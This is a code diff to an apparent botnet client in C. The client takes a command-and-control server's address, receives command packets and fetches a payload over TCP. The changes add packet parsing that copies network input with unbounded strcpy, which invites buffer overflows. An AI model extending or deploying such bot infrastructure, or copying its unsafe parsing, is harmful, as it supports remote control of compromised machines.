@@ -11,13 +11,34 @@
 #include "wrapper_functions.h"
 #include "msg.h"
 
-#define PAYLOAD_MAX 1024
+#define PAYLOAD_MAX 1024+1
 
 
 void usage()
 {
-	fprintf(stderr, "Usage: ./bot ip port");
+	fprintf(stderr, "Usage: ./bot ip port\n");
 	exit(1);
+}
+
+void parse_packet(struct msg *message, char *packet, int bytes_recv)
+{
+    int i = PORT_LEN + ADDR_LEN;
+
+    int counter = (bytes_recv - 1)/i;
+
+    message->command = *packet++;    
+
+    for(i = 0; i < counter; i++){
+        
+        strcpy(message->entry[i].ip_address, packet);
+        packet += sizeof(message->entry[i].ip_address);
+
+        strcpy(message->entry[i].port_number, packet);
+        packet += sizeof(message->entry[i].port_number);
+
+    }
+
+    message->number_of_pairs = counter;
 }
 
 void reg(int sockfd, char *ip, int port)
@@ -77,6 +98,7 @@ void prog_tcp(char *ip, int port, char *payload)
 	w_recv(sockfd, payload, PAYLOAD_MAX, 0);
 	
 	printf("Received payload.\n");
+	printf("Payload is: %s\n", payload);
 	
 	close(sockfd);
 	freeaddrinfo(res);
@@ -92,6 +114,8 @@ int main(int argc, char **argv)
 	int candc_port = atoi(argv[2]);
 	
 	struct msg message;
+	memset(&message, 0, sizeof(message));
+	
 	char payload[PAYLOAD_MAX];
 	
 	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
@@ -100,8 +124,14 @@ int main(int argc, char **argv)
 	
 	while(true){
 		
-		w_recv(sockfd, &message, sizeof message, 0);
+		memset(payload, 0, PAYLOAD_MAX);
 		
+		int bytes_recv = w_recv(sockfd, payload, PAYLOAD_MAX, 0);
+		
+		parse_packet(&message, payload, bytes_recv);
+		
+		memset(payload, 0, PAYLOAD_MAX);
+				
 		switch(message.command){
 			case '0':
 				quit();
